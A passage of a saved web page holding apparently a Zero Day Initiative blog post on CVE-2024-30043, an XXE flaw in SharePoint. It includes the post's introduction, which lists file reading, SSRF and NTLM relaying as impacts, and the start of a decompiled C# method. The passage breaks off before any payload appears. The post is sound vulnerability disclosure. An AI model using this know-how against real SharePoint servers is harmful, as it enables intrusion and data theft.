Man","code":"IM","phoneCode":"+44"},{"name":"Israel","code":"IL","phoneCode":"+972"},{"name":"Italy","code":"IT","phoneCode":"+39"},{"name":"Jamaica","code":"JM","phoneCode":"+1"},{"name":"Japan","code":"JP","phoneCode":"+81"},{"name":"Jersey","code":"JE","phoneCode":"+44"},{"name":"Jordan","code":"JO","phoneCode":"+962"},{"name":"Kazakhstan","code":"KZ","phoneCode":"+7"},{"name":"Kenya","code":"KE","phoneCode":"+254"},{"name":"Kiribati","code":"KI","phoneCode":"+686"},{"name":"Kosovo","code":"XK","phoneCode":"+383"},{"name":"Kuwait","code":"KW","phoneCode":"+965"},{"name":"Kyrgyzstan","code":"KG","phoneCode":"+996"},{"name":"Laos","code":"LA","phoneCode":"+856"},{"name":"Latvia","code":"LV","phoneCode":"+371"},{"name":"Lebanon","code":"LB","phoneCode":"+961"},{"name":"Lesotho","code":"LS","phoneCode":"+266"},{"name":"Liberia","code":"LR","phoneCode":"+231"},{"name":"Libya","code":"LY","phoneCode":"+218"},{"name":"Liechtenstein","code":"LI","phoneCode":"+423"},{"name":"Lithuania","code":"LT","phoneCode":"+370"},{"name":"Luxembourg","code":"LU","phoneCode":"+352"},{"name":"Macao SAR China","code":"MO","phoneCode":"+853"},{"name":"Madagascar","code":"MG","phoneCode":"+261"},{"name":"Malawi","code":"MW","phoneCode":"+265"},{"name":"Malaysia","code":"MY","phoneCode":"+60"},{"name":"Maldives","code":"MV","phoneCode":"+960"},{"name":"Mali","code":"ML","phoneCode":"+223"},{"name":"Malta","code":"MT","phoneCode":"+356"},{"name":"Marshall Islands","code":"MH","phoneCode":"+692"},{"name":"Martinique","code":"MQ","phoneCode":"+596"},{"name":"Mauritania","code":"MR","phoneCode":"+222"},{"name":"Mauritius","code":"MU","phoneCode":"+230"},{"name":"Mayotte","code":"YT","phoneCode":"+262"},{"name":"Mexico","code":"MX","phoneCode":"+52"},{"name":"Micronesia","code":"FM","phoneCode":"+691"},{"name":"Moldova","code":"MD","phoneCode":"+373"},{"name":"Monaco","code":"MC","phoneCode":"+377"},{"name":"Mongolia","code":"MN","phoneCode":"+976"},{"name":"Montenegro","code":"ME","phoneCode":"+382"},{"name":"Montserrat","code":"MS","phoneCode":"+1"},{"name":"Morocco","code":"MA","phoneCode":"+212"},{"name":"Mozambique","code":"MZ","phoneCode":"+258"},{"name":"Myanmar (Burma)","code":"MM","phoneCode":"+95"},{"name":"Namibia","code":"NA","phoneCode":"+264"},{"name":"Nauru","code":"NR","phoneCode":"+674"},{"name":"Nepal","code":"NP","phoneCode":"+977"},{"name":"Netherlands","code":"NL","phoneCode":"+31"},{"name":"New Caledonia","code":"NC","phoneCode":"+687"},{"name":"New Zealand","code":"NZ","phoneCode":"+64"},{"name":"Nicaragua","code":"NI","phoneCode":"+505"},{"name":"Niger","code":"NE","phoneCode":"+227"},{"name":"Nigeria","code":"NG","phoneCode":"+234"},{"name":"Niue","code":"NU","phoneCode":"+683"},{"name":"Norfolk Island","code":"NF","phoneCode":"+672"},{"name":"Northern Mariana Islands","code":"MP","phoneCode":"+1"},{"name":"North Korea","code":"KP","phoneCode":"+850"},{"name":"North Macedonia","code":"MK","phoneCode":"+389"},{"name":"Norway","code":"NO","phoneCode":"+47"},{"name":"Oman","code":"OM","phoneCode":"+968"},{"name":"Pakistan","code":"PK","phoneCode":"+92"},{"name":"Palau","code":"PW","phoneCode":"+680"},{"name":"Palestinian Territories","code":"PS","phoneCode":"+970"},{"name":"Panama","code":"PA","phoneCode":"+507"},{"name":"Papua New Guinea","code":"PG","phoneCode":"+675"},{"name":"Paraguay","code":"PY","phoneCode":"+595"},{"name":"Peru","code":"PE","phoneCode":"+51"},{"name":"Philippines","code":"PH","phoneCode":"+63"},{"name":"Poland","code":"PL","phoneCode":"+48"},{"name":"Portugal","code":"PT","phoneCode":"+351"},{"name":"Puerto Rico","code":"PR","phoneCode":"+1"},{"name":"Qatar","code":"QA","phoneCode":"+974"},{"name":"R\u00E9union","code":"RE","phoneCode":"+262"},{"name":"Romania","code":"RO","phoneCode":"+40"},{"name":"Russia","code":"RU","phoneCode":"+7"},{"name":"Rwanda","code":"RW","phoneCode":"+250"},{"name":"Samoa","code":"WS","phoneCode":"+685"},{"name":"San Marino","code":"SM","phoneCode":"+378"},{"name":"S\u00E3o Tom\u00E9 & Pr\u00EDncipe","code":"ST","phoneCode":"+239"},{"name":"Saudi Arabia","code":"SA","phoneCode":"+966"},{"name":"Senegal","code":"SN","phoneCode":"+221"},{"name":"Serbia","code":"RS","phoneCode":"+381"},{"name":"Seychelles","code":"SC","phoneCode":"+248"},{"name":"Sierra Leone","code":"SL","phoneCode":"+232"},{"name":"Singapore","code":"SG","phoneCode":"+65"},{"name":"Sint Maarten","code":"SX","phoneCode":"+1"},{"name":"Slovakia","code":"SK","phoneCode":"+421"},{"name":"Slovenia","code":"SI","phoneCode":"+386"},{"name":"Solomon Islands","code":"SB","phoneCode":"+677"},{"name":"Somalia","code":"SO","phoneCode":"+252"},{"name":"South Africa","code":"ZA","phoneCode":"+27"},{"name":"South Korea","code":"KR","phoneCode":"+82"},{"name":"South Sudan","code":"SS","phoneCode":"+211"},{"name":"Spain","code":"ES","phoneCode":"+34"},{"name":"Sri Lanka","code":"LK","phoneCode":"+94"},{"name":"St. Barth\u00E9lemy","code":"BL","phoneCode":"+590"},{"name":"St. Helena","code":"SH","phoneCode":"+290"},{"name":"St. Kitts & Nevis","code":"KN","phoneCode":"+1"},{"name":"St. Lucia","code":"LC","phoneCode":"+1"},{"name":"St. Martin","code":"MF","phoneCode":"+590"},{"name":"St. Pierre & Miquelon","code":"PM","phoneCode":"+508"},{"name":"St. Vincent & Grenadines","code":"VC","phoneCode":"+1"},{"name":"Sudan","code":"SD","phoneCode":"+249"},{"name":"Suriname","code":"SR","phoneCode":"+597"},{"name":"Svalbard & Jan Mayen","code":"SJ","phoneCode":"+47"},{"name":"Sweden","code":"SE","phoneCode":"+46"},{"name":"Switzerland","code":"CH","phoneCode":"+41"},{"name":"Syria","code":"SY","phoneCode":"+963"},{"name":"Taiwan","code":"TW","phoneCode":"+886"},{"name":"Tajikistan","code":"TJ","phoneCode":"+992"},{"name":"Tanzania","code":"TZ","phoneCode":"+255"},{"name":"Thailand","code":"TH","phoneCode":"+66"},{"name":"Timor-Leste","code":"TL","phoneCode":"+670"},{"name":"Togo","code":"TG","phoneCode":"+228"},{"name":"Tokelau","code":"TK","phoneCode":"+690"},{"name":"Tonga","code":"TO","phoneCode":"+676"},{"name":"Trinidad & Tobago","code":"TT","phoneCode":"+1"},{"name":"Tristan da Cunha","code":"TA","phoneCode":"+290"},{"name":"Tunisia","code":"TN","phoneCode":"+216"},{"name":"T\u00FCrkiye","code":"TR","phoneCode":"+90"},{"name":"Turkmenistan","code":"TM","phoneCode":"+993"},{"name":"Turks & Caicos Islands","code":"TC","phoneCode":"+1"},{"name":"Tuvalu","code":"TV","phoneCode":"+688"},{"name":"U.S. Virgin Islands","code":"VI","phoneCode":"+1"},{"name":"Uganda","code":"UG","phoneCode":"+256"},{"name":"Ukraine","code":"UA","phoneCode":"+380"},{"name":"United Arab Emirates","code":"AE","phoneCode":"+971"},{"name":"United Kingdom","code":"GB","phoneCode":"+44"},{"name":"United States","code":"US","phoneCode":"+1"},{"name":"Uruguay","code":"UY","phoneCode":"+598"},{"name":"Uzbekistan","code":"UZ","phoneCode":"+998"},{"name":"Vanuatu","code":"VU","phoneCode":"+678"},{"name":"Vatican City","code":"VA","phoneCode":"+39"},{"name":"Venezuela","code":"VE","phoneCode":"+58"},{"name":"Vietnam","code":"VN","phoneCode":"+84"},{"name":"Wallis & Futuna","code":"WF","phoneCode":"+681"},{"name":"Western Sahara","code":"EH","phoneCode":"+212"},{"name":"Yemen","code":"YE","phoneCode":"+967"},{"name":"Zambia","code":"ZM","phoneCode":"+260"},{"name":"Zimbabwe","code":"ZW","phoneCode":"+263"}],"initialAddressFormat":{"id":0,"type":"ADDRESS","country":"US","labelLocale":"en","fields":[{"type":"FIELD","label":"Address Line 1","identifier":"Line1","length":0,"required":true,"metadata":{"autocomplete":"address-line1"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"Address Line 2","identifier":"Line2","length":0,"required":false,"metadata":{"autocomplete":"address-line2"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"City","identifier":"City","length":0,"required":true,"metadata":{"autocomplete":"address-level2"}},{"type":"SEPARATOR","label":",","identifier":"Comma","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"State","identifier":"State","length":0,"required":true,"metadata":{"autocomplete":"address-level1"}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"ZIP Code","identifier":"Zip","length":0,"required":true,"metadata":{"autocomplete":"postal-code"}}]},"initialNameOrder":"GIVEN_FIRST"},"localizedStrings":{"validation":{"noValidSelection":"A valid selection must be made.","invalidUrl":"Must be a valid URL.","stringTooLong":"Value should have a length no longer than {0}.","containsInvalidKey":"{0} contains an invalid key.","invalidTwitterUsername":"Must be a valid Twitter username.","valueOutsideRange":"Value must be in the range {0} to {1}.","invalidPassword":"Passwords should not contain whitespace.","missingRequiredSubfields":"{0} is missing required subfields: {1}","invalidCurrency":"Currency value should be formatted like 1234 or 123.99.","invalidMapSize":"Value should contain exactly {0} elements.","subfieldsRequired":"All fields in {0} are required.","formSubmissionFailed":"Form submission failed. Review the following information: {0}.","invalidCountryCode":"Country code should have an optional plus and up to 4 digits.","invalidDate":"This is not a real date.","required":"{0} is required.","invalidStringLength":"Value should be {0} characters long.","invalidEmail":"Email addresses should follow the format user@domain.com.","invalidListLength":"Value should be {0} elements long.","allEmpty":"Please fill out at least one form field.","missingRequiredQuestion":"Missing a required question.","invalidQuestion":"Contained an invalid question.","captchaFailure":"Captcha validation failed. Please try again.","stringTooShort":"Value should have a length of at least {0}.","invalid":"{0} is not valid.","formErrors":"Form Errors","containsInvalidValue":"{0} contains an invalid value.","invalidUnsignedNumber":"Numbers must contain only digits and no other characters.","invalidName":"Valid names contain only letters, numbers, spaces, ', or - characters."},"submit":"Submit","status":{"title":"{@} Block","learnMore":"Learn more"},"name":{"firstName":"First Name","lastName":"Last Name"},"lightbox":{"openForm":"Open Form"},"likert":{"agree":"Agree","stronglyDisagree":"Strongly Disagree","disagree":"Disagree","stronglyAgree":"Strongly Agree","neutral":"Neutral"},"time":{"am":"AM","second":"Second","pm":"PM","minute":"Minute","amPm":"AM/PM","hour":"Hour"},"notFound":"Form not found.","date":{"yyyy":"YYYY","year":"Year","mm":"MM","day":"Day","month":"Month","dd":"DD"},"phone":{"country":"Country","number":"Number","prefix":"Prefix","areaCode":"Area Code","line":"Line"},"submitError":"Unable to submit form. Please try again later.","address":{"stateProvince":"State/Province","country":"Country","zipPostalCode":"Zip/Postal Code","address2":"Address 2","address1":"Address 1","city":"City"},"email":{"signUp":"Sign up for news and updates"},"cannotSubmitDemoForm":"This is a demo form and cannot be submitted.","required":"(required)","invalidData":"Invalid form data."}}};</script><script>Squarespace.load(window);</script>
<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.thezdi.com/blog?format=rss">
<script type="application/ld+json">{"url":"https://www.thezdi.com","name":"Zero Day Initiative","description":"","@context":"http://schema.org","@type":"WebSite"}</script><script type="application/ld+json">{"address":"","@context":"http://schema.org","@type":"LocalBusiness"}</script><script type="application/ld+json">{"name":"Zero Day Initiative \u2014 CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud","url":"https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud","datePublished":"2024-05-30T10:44:46-0500","dateModified":"2024-05-30T10:44:46-0500","headline":"CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud","author":"Piotr Bazyd\u0142o","publisher":{"name":"Zero Day Initiative","logo":{"@type":"ImageObject"},"@context":"http://schema.org","@type":"Organization"},"image":"http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/66575e596871b708e060acf8/1717083886356/abstract-structure-farm-window-cattle-agriculture-594813-pxhere.com.jpg?format=1500w","@context":"http://schema.org","@type":"Article"}</script><link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/site.css"><script>
if (window.location.host == "www.thezdi.com") {window.location = "https://www.zerodayinitiative.com" + window.location.pathname}</script><script>Static.COOKIE_BANNER_CAPABLE = true;</script>
<script async="" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/js(1)"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('set', 'developer_id.dZjQwMz', true);gtag('config', 'UA-93169700-1');</script><!-- End of Squarespace Headers -->
    <link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/main.css">
</head>
<body class="home" id="yui_3_17_2_1_1762949716544_136">


<div id="nav" class="group">
    <div id="navContent">
        <div class="nav__container">
            <div class="nav__header">
                <div class="global-header__logo">
                    <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/logo-combo.svg" alt="thezdi"></a>
                </div>
                <div id="mobileNavIcon" class="js-mobile-nav-toggle">Menu</div>
                <div id="mobileOverlay"></div>
            </div>
            <nav class="nav__list" role="main-navigation">
                <ul class="list-no-bullets">
                    <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy">PRIVACY</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
                    <li class="nav__tier1 userActions">
                        <a href="https://www.zerodayinitiative.com/portal/">LOG IN</a>
                        <a href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a>
                    </li>
                    <li>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
</div>

<!-- Begin Off Canvas Menu-->
<div class="off-canvas">
    <nav class="off-canvas__list" role="main-navigation2">
        <div class="js-mobile-nav-toggle">Menu</div>
        <ul class="topMenu">
            <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy/">PRIVACY</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/">LOG IN</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a></li>
        </ul>
        <ul class="bottomMenu">
            <li class="nav__tier1">
                <a href="https://www.trendmicro.com/"><img src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/logo-trend.svg" alt="Trend Micro"></a>
            </li>
            <li class="nav__tier1 logo"><a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/logo-zdi.svg" alt="thezdi"></a></li>
        </ul>
    </nav>
</div>
<!-- End Off Canvas Menu -->

<div id="mainContent" class="blogDetails group subscribeAbs">
    <div id="imageMasthead" class="smaller">
        <div class="content">
            
                <h1 class="title" data-content-field="title">
                  
                CVE-2024-30043: Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud
                  
                </h1>
                <data>May 30, 2024  |  Piotr Bazydło</data>
            
        </div>
    </div>

            <div class="blog-listing blog-details" id="yui_3_17_2_1_1762949716544_135">
                <div class="subscribe-container">
                    <a href="https://www.zerodayinitiative.com/rss/" class="btn subscribe rounded">SUBSCRIBE</a>
                </div>
                <div class="section" id="yui_3_17_2_1_1762949716544_134">
                    <div class="contentBlock" id="yui_3_17_2_1_1762949716544_133">
                        <div class="contentBlockCopy" style="float: none;" id="yui_3_17_2_1_1762949716544_132">

                            <div class="group" style="max-width: 1000px;" id="yui_3_17_2_1_1762949716544_131">
                                <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" data-updated-on="1717001938318" id="item-66575e596871b708e060acf8"><div class="row sqs-row" id="yui_3_17_2_1_1762949716544_130"><div class="col sqs-col-12 span-12" id="yui_3_17_2_1_1762949716544_129"><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-918d402f409273f55ef3"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Yes, the title is right. This blog covers an XML eXternal Entity (XXE) injection vulnerability that I found in SharePoint. The bug was recently patched by Microsoft. In general, XXE vulnerabilities are not very exciting in terms of discovery and related technical aspects. They may sometimes be fun to exploit and exfiltrate data (or do other nasty things) in real environments, but in the vulnerability research world, you typically find them, report them, and forget about them.</p><p class="" style="white-space:pre-wrap;">So why am I writing a blog post about an XXE? I have two reasons:</p><p style="margin-left:40px;white-space:pre-wrap;" class="">·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; It affects SharePoint, both on-prem and cloud instances, which is a nice target. This vulnerability can be exploited by a low-privileged user.<br>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This is one of the craziest XXEs that I have ever seen (and found), both in terms of vulnerability discovery and the method of triggering. When we talk about overall exploitation and impact, <a href="https://muffsec.com/blog/pwn2own-xxe2rce/">this Pwn2Own win</a> by Chris Anastasio and Steven Seeley is still my favorite.</p><p class="" style="white-space:pre-wrap;">The vulnerability is known as <a href="https://www.zerodayinitiative.com/advisories/ZDI-24-453/">CVE-2024-30043</a>, and, as one would expect with an XXE, it allows you to:</p><p style="margin-left:40px;white-space:pre-wrap;" class="">·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Read files with SharePoint Farm Service account permission.<br>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perform Server-side request forgery (SSRF) attacks.<br>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perform NTLM Relaying.<br>·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Achieve any other side effects to which XXE may lead.</p><p class="" style="white-space:pre-wrap;">Let us go straight to the details.</p><p class="" style="white-space:pre-wrap;"><strong>BaseXmlDataSource DataSource</strong></p>
</div>




















  
  



</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_70956"><div class="sqs-block-content"><p><code>Microsoft.SharePoint.WebControls.BaseXmlDataSource</code> is an abstract base class, inheriting from <code>DataSource</code>, for data source objects that can be added to a SharePoint Page. DataSource can be included in a SharePoint page, in order to retrieve data (in a way specific to a particular DataSource). When a <code>BaseXmlDataSource</code> is present on a page, its <code>Execute</code> method will be called at some point during page rendering:</p>

</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;customThumbEnabled&quot;:false,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/zdi-team/b7029d03c01bcb6bef30519c2bd45306.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1716478721166_71792"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_68" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/b7029d03c01bcb6bef30519c2bd45306.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/gist-embed-0ac919313390.css"><div id="gist130535201" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2024-30043-0-cs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2024-30043-0.cs content, created by zdi-team on 03:19PM on May 29, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2024-30043-0.cs">
        <tbody><tr>
          <td id="file-cve-2024-30043-0-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2024-30043-0-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">protected</span> <span class="pl-smi">XmlDocument</span> <span class="pl-en">Execute</span><span class="pl-kos">(</span><span class="pl-smi">string</span> <span class="pl-s1">request</span><span class="pl-kos">)</span> <span class="pl-c">// [1]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2024-30043-0-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2024-30043-0-cs-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">SPSite</span> <span class="pl-s1">spsite</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2024-30043-0-cs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">try</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2024-30043-0-cs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cve-2024-30043-0-cs-LC6" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-s1">BaseXmlDataSource</span><span class="pl-kos">.</span><span class="pl-en">GetAdminSettings</span><span class="pl-kos">(</span><span class="pl-k">out</span> <span class="pl-s1">spsite</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">DataSourceControlEnabled</span><span class="pl-kos">)</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cve-2024-30043-0-cs-LC7" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cve-2024-30043-0-cs-LC8" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">throw</span> <span class="pl-k">new</span> <span class="pl-smi">DataSourceControlDisabledException</span><span class="pl-kos">(</span><span class="pl-s1">SPResource</span><span class="pl-kos">.</span><span class="pl-en">GetString</span><span class="pl-kos">(</span><span class="pl-s">"DataSourceControlDisabled"</span><span class="pl-kos">,</span> <span class="pl-k">new</span> <span class="pl-smi">object</span><span class="pl-kos">[</span><span class="pl-c1">0</span><span class="pl-kos">]</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cve-2024-30043-0-cs-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cve-2024-30043-0-cs-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">string</span> <span class="pl-s1">text</span> <span class="pl-c1">=</span> <span class="pl-k">this</span><span class="pl-kos">.</span><span class="pl-en">FetchData</span><span class="pl-kos">(</span><span class="pl-s1">request</span><span class="pl-kos">)</span><span class="pl-kos">;</span> <span class="pl-c">// [2]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cve-2024-30043-0-cs-LC11" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">text</span> <span class="pl-c1">!=</span> <span class="pl-c1">null</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">text</span><span class="pl-kos">.</span><span class="pl-s1">Length</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">0</span><span class="pl-kos">)</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cve-2024-30043-0-cs-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cve-2024-30043-0-cs-LC13" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">XmlReaderSettings</span> <span class="pl-s1">xmlReaderSettings</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">XmlReaderSettings</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cve-2024-30043-0-cs-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">xmlReaderSettings</span><span class="pl-kos">.</span><span class="pl-s1">DtdProcessing</span> <span class="pl-c1">=</span> <span class="pl-s1">DtdProcessing</span><span class="pl-kos">.</span><span class="pl-s1">Prohibit</span><span class="pl-kos">;</span> <span class="pl-c">// [3]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cve-2024-30043-0-cs-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">XmlTextReader</span> <span class="pl-s1">xmlTextReader</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">XmlTextReader</span><span class="pl-kos">(</span><span class="pl-k">new</span> <span class="pl-smi">StringReader</span><span class="pl-kos">(</span><span class="pl-s1">text</span><span class="pl-kos">)</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cve-2024-30043-0-cs-LC16" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">XmlSecureResolver</span> <span class="pl-s1">xmlResolver</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-smi">XmlSecureResolver</span><span class="pl-kos">(</span><span class="pl-k">new</span> <span class="pl-smi">XmlUrlResolver</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">,</span> <span class="pl-s1">request</span><span class="pl-kos">)</span><span class="pl-kos">;</span> <span class="pl-c">// [4]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cve-2024-30043-0-cs-LC17" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">xmlTextReader</span><span class="pl-kos">.</span><span class="pl-s1">XmlResolver</span> <span class="pl-c1">=</span> <span class="pl-s1">xmlResolver</span><span class="pl-kos">;</span> <span class="pl-c">// [5]</span></td>
        </tr>
        <tr>
          <td id="file-cve-2024-30043-0-cs-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cve-2024-30043-0-cs-LC18" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">XmlReader</span> <span class="pl-s1">xmlReader</span> <span class="pl-c1">=</span> <span class="pl-s1">XmlReader</span><span class="pl-kos">.</span><span class="pl-en">Create</span><span class="pl-kos">(</span><span class="pl-s1">xmlTextReader</span><span class="pl-kos">,</span> <span class="pl-s1">xmlReaderSettings</span><span class="pl-kos">)</span><span class="pl-kos">;</span> <span class="pl-c">// [6]</span></td>
        </tr>
        <tr>
